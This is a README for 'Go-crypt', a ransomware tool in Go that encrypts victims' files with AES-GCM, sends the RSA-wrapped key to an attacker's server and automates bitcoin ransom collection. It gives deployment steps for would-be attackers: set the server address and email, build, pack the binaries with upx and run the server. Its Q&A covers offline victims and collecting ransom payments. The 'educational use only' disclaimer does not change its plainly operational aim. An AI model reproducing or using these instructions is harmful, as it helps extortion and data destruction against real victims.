# Go-crypt
**Go-crypt** is a simple and ellegant ransomware that implements aes-gcm encryption, public key encryption and automated bitcoin transactions.

## Main features
* Encryption - 256-bit AES-GCM with random 96-bit nonces
* Security - Key is encrypted with 2048 OAEP rsa public key before being sent away.
* Multi-platform - Windows and GNU/Linux
* Convenience - Automatic bitcoin transactions. Unlocks at 6+ confirmations.

## How it works
Blah, blah, you don't care about the details... You only want to get this thing running so here's what you need to do:
1. `go run gen_rsa.go`
    1. copy values
    2. modify `decrypt-key.go`, `crypter/encrypt.go` and `server.go` with those values (there are comments that tell you where those things should go)
2. modify `crypter/*crypt.go` with servers ip address (or domain if you're a cool kid)
3. modify `crypter/encrypt.go` with your email
4. modify `config.json` according to your needs
5. `make`
6. package the bins
    * `upx --brute bins/<file>`
7. spin up the server
    * `go run server.go`
8. enjoy!

## Q&A
_Can I do a test run?_
Yes, if you're on UNIX specify the `HOME` variable before the script.

_B-but what if my tawget doesn't have intewnet?_
No problem, a key.txt file will be created in the exectuion dir. Ask them to give you the file then decrypt it with `decrypt_key.go` and put the key into `decrypt-offline.go` then you just compile it like you did with the other bins.

_Ok, fine, how do I get my money after a successfull ransom?_
Simply sweep the private addresses from the `log.txt` file. Do I also need to teach you how to grep?

_It just doesn't work!_
Try without compression.

_I did, still doesn't work!_
In case you're on linux you need to generate with a machine ID with `dbus-uuidgen` and put it in `/etc/machine-id`.

## LEGAL NOTICE
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.

## License
**Go-crypt** is made with ♥  by target_ and is licensed under WTFPL - Do What the Fuck You Want to Public License, which is pretty clear on what you can and what you can't do:
0. You just DO WHAT THE FUCK YOU WANT TO.
